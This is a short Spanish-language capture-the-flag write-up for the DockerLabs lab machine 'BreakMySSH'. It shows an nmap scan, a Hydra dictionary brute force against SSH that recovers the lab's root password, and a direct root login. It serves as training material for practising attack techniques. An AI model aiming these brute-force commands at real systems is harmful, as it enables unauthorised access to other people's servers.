# Máquina: BreakMySSH — DockerLabs

**Dificultad:** Muy fácil  
**SO:** Debian Linux  
**IP objetivo:** `172.17.0.2`  
**Técnicas:** Fuerza bruta SSH con usuario y contraseña por diccionario

---

## Flujo del ataque

```
Ping → Nmap (solo SSH) → Hydra (root:estrella) → SSH → ROOT directo
```

---

## 1. Reconocimiento

### Ping

```bash
ping 172.17.0.2
```

```
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.068 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.057 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.055 ms
```

TTL = 64 → Sistema Linux confirmado.

### Nmap

```bash
sudo nmap -p- -sS -sC --min-rate 5000 -vvv -Pn -n -oN scan 172.17.0.2
```

| Puerto | Estado | Servicio |
|--------|--------|----------|
| 22/tcp | open   | SSH      |

Solo el puerto 22 está abierto. No hay superficie web que enumerar, por lo que el único vector de entrada es el propio servicio SSH.

---

## 2. Acceso inicial — Fuerza bruta SSH

Sin ningún usuario previo, se realiza un ataque de diccionario tanto en usuarios como en contraseñas usando listas de SecLists y rockyou.txt.

```bash
hydra -L ~/Desktop/Lists/SecLists/Usernames/top-usernames-shortlist.txt \
      -P ~/Desktop/Lists/Rockyou/rockyou.txt \
      ssh://172.17.0.2 -v
```

```
[22][ssh] host: 172.17.0.2   login: root   password: estrella
```

El servidor permite autenticación por contraseña directamente como `root` (`PermitRootLogin yes` en sshd_config), lo cual es una configuración extremadamente insegura.

---

## 3. Conexión SSH → ROOT directo

```bash
ssh root@172.17.0.2
# Password: estrella
```

```
root@c67200ea5eef:~# id
uid=0(root) gid=0(root) groups=0(root)

root@c67200ea5eef:~# whoami
root
```

Acceso root obtenido directamente. No fue necesaria escalada de privilegios.

---

## Credenciales

| Usuario | Contraseña | Método              |
|---------|------------|---------------------|
| root    | estrella   | Hydra + rockyou.txt |
